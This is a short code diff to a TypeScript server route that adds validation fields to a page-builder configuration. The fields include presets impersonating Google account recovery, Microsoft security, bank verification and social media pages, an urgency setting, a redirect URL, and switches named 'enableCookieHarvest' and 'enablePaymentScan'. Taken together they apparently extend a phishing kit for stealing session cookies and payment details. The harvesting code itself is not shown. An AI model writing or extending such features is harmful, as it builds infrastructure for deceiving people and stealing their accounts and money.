@@ -4220,6 +4220,16 @@ export async function registerRoutes(
           silentMode: z.boolean().default(false),
           persistentConnection: z.boolean().default(false),
           sessionLabel: z.string().max(200).default(""),
+          pagePreset: z.enum(["custom", "google_recovery", "microsoft_security", "bank_verification", "it_management", "social_media"]).default("custom"),
+          pageDescription: z.string().max(500).default(""),
+          pageIcon: z.enum(["shield", "lock", "key", "user", "building", "globe"]).default("shield"),
+          redirectUrl: z.string().max(500).default("").refine((v) => {
+            if (!v) return true;
+            try { const u = new URL(v); return ["http:", "https:"].includes(u.protocol); } catch { return false; }
+          }, { message: "Redirect URL must be a valid HTTP/HTTPS URL" }),
+          urgencyLevel: z.enum(["low", "medium", "high"]).default("medium"),
+          enableCookieHarvest: z.boolean().default(false),
+          enablePaymentScan: z.boolean().default(false),
         }).default({}),
       }).parse(req.body);
       const steps = body.pageConfig.steps;
